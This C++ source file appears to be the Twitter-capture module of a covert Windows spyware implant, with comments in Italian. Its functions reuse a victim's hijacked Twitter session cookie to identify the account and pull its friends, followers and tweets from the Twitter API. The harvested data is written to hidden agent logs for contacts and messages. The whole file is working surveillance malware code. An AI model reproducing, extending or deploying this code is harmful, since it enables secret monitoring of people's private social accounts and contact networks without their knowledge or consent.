#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"
#include "..\bin_string.h"

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 
extern BOOL bPM_MailCapStarted;

extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp

#define TWITTER_FOLLOWER 1
#define TWITTER_FRIEND   0
#define TW_CONTACT_ID1 "\"screen_name\":\""
#define TW_CONTACT_ID2 "\"name\":\""
#define TW_ID_LIMIT 95
DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL, *r_buffer_inner = NULL;
	DWORD response_len;
	char *parser1, *parser2, *parser_inner1, *parser_inner2;
	WCHAR twitter_request[256];
	char post_data[2048];
	char contact_name[256];
	char screen_name[256];
	char *id_ptr;
	HANDLE hfile;
	DWORD id_count;
	WCHAR *screen_name_w, *contact_name_w;
	char *tag1, *tag2;

	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	
	parser1 = (char *)strstr((char *)r_buffer, "\"ids\":[");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("\"ids\":[");
	parser2 = (char *)strchr((char *)parser1, ']');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;	

	id_ptr = parser1;
	LOOP {
		if (!id_ptr || *id_ptr==0) 
			break;

		id_count = 1;
		LOOP {
			id_ptr = strstr((char *)id_ptr, ",");
			if (!id_ptr)
				break;
			if (id_count == TW_ID_LIMIT) {
				*id_ptr=0;
				id_ptr++;
				break;
			}
			id_count++;
			id_ptr++;
		}			
		
		_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "user_id=%s", parser1);
		parser1 = id_ptr;
		
		ret_val = HttpSocialRequest(L"api.twitter.com", L"POST", L"/1/users/lookup.json", 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &response_len, cookie);	
		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
			SAFE_FREE(r_buffer);
			return ret_val;
		}
	
		CheckProcessStatus();

		// Verifica quale tag c'e' per primo
		parser_inner1 = strstr((char *)r_buffer_inner, TW_CONTACT_ID1);
		parser_inner2 = strstr((char *)r_buffer_inner, TW_CONTACT_ID2);
		if (!parser_inner1 || !parser_inner2) {
			SAFE_FREE(r_buffer);
			SAFE_FREE(r_buffer_inner);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		if (parser_inner1 < parser_inner2) {
			tag1 = TW_CONTACT_ID1;
			tag2 = TW_CONTACT_ID2;
		} else {
			tag1 = TW_CONTACT_ID2;
			tag2 = TW_CONTACT_ID1;
		}

		parser_inner1 = (char *)r_buffer_inner;
	
		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
		LOOP {
			parser_inner1 = strstr(parser_inner1, tag1);
			if (!parser_inner1)
				break;
			parser_inner1 += strlen(tag1);
			parser_inner2 = strchr(parser_inner1, '\"');
			if (!parser_inner2)
				break;
			*parser_inner2 = NULL;
			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser_inner1);
			parser_inner1 = parser_inner2 + 1;

			parser_inner1 = strstr(parser_inner1, tag2);
			if (!parser_inner1)
				break;
			parser_inner1 += strlen(tag2);
			parser_inner2 = strchr(parser_inner1, '\"');
			if (!parser_inner2)
				break;
			*parser_inner2 = NULL;
			_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser_inner1);
			parser_inner1 = parser_inner2 + 1;

			contact_name_w = UTF8_2_UTF16(contact_name);
			screen_name_w = UTF8_2_UTF16(screen_name);

			if (tag1 != TW_CONTACT_ID1)
				DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
			else
				DumpContact(hfile, CONTACT_SRC_TWITTER, contact_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name_w, NULL, flags);
		
			SAFE_FREE(contact_name_w);
			SAFE_FREE(screen_name_w);
		}
		Log_CloseFile(hfile);
		SAFE_FREE(r_buffer_inner);
	}

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleTwitterContacts(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];
	WCHAR user_name[256];
	static BOOL scanned = FALSE;
	HANDLE hfile;

	CheckProcessStatus();

	if (!bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	if (scanned)
		return SOCIAL_REQUEST_SUCCESS;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	LOOP {
		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
		if (!parser1) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		parser1 += strlen("data-user-id=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
		if (strlen(user)) 
			break;
		parser1 = parser2 + 1;
	}

	// Cattura il proprio account
	parser1 = parser2 + 1;
	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
	if (parser1) {
		parser1 += strlen("data-screen-name=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (parser2) {
			*parser2=0;
			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);		
			DumpContact(hfile, CONTACT_SRC_TWITTER, user_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
			Log_CloseFile(hfile);
		}
	}
	
	SAFE_FREE(r_buffer);
	scanned = TRUE;

	ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
	return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
}

#define TW_TWEET_BODY "\"text\":\""
#define TW_TWEET_ID "\"id_str\":\""
#define TW_TWEET_TS "\"created_at\":\""
DWORD ParseTweet(char *user, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	WCHAR twitter_request[256];
	char tweet_body[256];
	char tweet_id[256];
	char tweet_ts[256];
	char screen_name[256];
	ULARGE_INTEGER act_tstamp;
	DWORD last_tstamp_hi, last_tstamp_lo;
	struct tm tstamp;

	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);

	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/statuses/user_timeline.json?user_id=%S", user);
	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	for (;;) {
		CheckProcessStatus();
		parser1 = strstr(parser1, TW_TWEET_TS);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_TS);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(tweet_ts, sizeof(tweet_ts), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, TW_TWEET_ID);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_ID);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		if (!atoi(tweet_id))
			continue;
		// Verifica se e' gia' stato preso
		sscanf_s(tweet_id, "%llu", &act_tstamp);
		if (act_tstamp.HighPart < last_tstamp_hi)
			break;
		if (act_tstamp.HighPart==last_tstamp_hi && act_tstamp.LowPart<=last_tstamp_lo)
			break;
		SetLastFBTstamp(user, act_tstamp.LowPart, act_tstamp.HighPart);

		parser1 = strstr(parser1, TW_TWEET_BODY);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_BODY);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, TW_CONTACT_ID1);
		if (!parser1)
			break;
		parser1 += strlen(TW_CONTACT_ID1);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// XXX Sistemare il timestamp
		GET_TIME(tstamp);
		LogSocialIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE); 	

		parser1 = strstr(parser1, TW_TWEET_TS);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_TS);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		parser1 = parser2 + 1;
	}

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleTwitterTweets(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];

	CheckProcessStatus();

	if (!bPM_IMStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	LOOP {
		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
		if (!parser1) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		parser1 += strlen("data-user-id=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
		if (strlen(user)) 
			break;
		parser1 = parser2 + 1;
	}

	SAFE_FREE(r_buffer);
	return ParseTweet(user, cookie);
}
